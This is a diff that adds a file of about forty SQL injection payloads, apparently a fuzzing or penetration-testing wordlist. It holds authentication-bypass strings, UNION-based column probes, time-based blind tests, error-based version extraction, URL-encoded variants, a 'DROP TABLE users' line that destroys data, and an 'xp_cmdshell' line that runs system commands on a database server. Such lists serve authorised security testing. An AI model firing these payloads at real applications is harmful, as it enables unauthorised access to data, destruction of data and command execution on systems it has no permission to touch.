@@ -1,0 +1,41 @@
+# SQL Injection payloads
+' OR '1'='1
+' OR '1'='1' --
+" OR "1"="1
+" OR "1"="1" --
+; DROP TABLE users --
+'; EXEC xp_cmdshell('dir') --
+' UNION SELECT null,null,null --
+' UNION SELECT 1,2,3 --
+' UNION ALL SELECT null,null,null --
+admin' --
+' AND 1=1 --
+' AND 1=2 --
+' AND SLEEP(5) --
+' OR SLEEP(5) --
+' AND BENCHMARK(10000000,MD5('test')) --
+%27%20OR%20%271%27%3D%271
+%27%20UNION%20SELECT%20null--
+%27%20AND%201=1--
+%27%20AND%201=2--
+' OR '1'='1'/*
+' OR '1'='1' #
+admin' #'
+' OR 1=1 #
+' OR 1=1 --
+' OR 'x'='x
+' OR 'x'='x' --
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 10--
+1' UNION SELECT 1--
+1' UNION SELECT 1,2--
+1' UNION SELECT 1,2,3--
+' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1 AND SLEEP(5)
+1; SELECT SLEEP(5)
+1' AND SLEEP(5)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
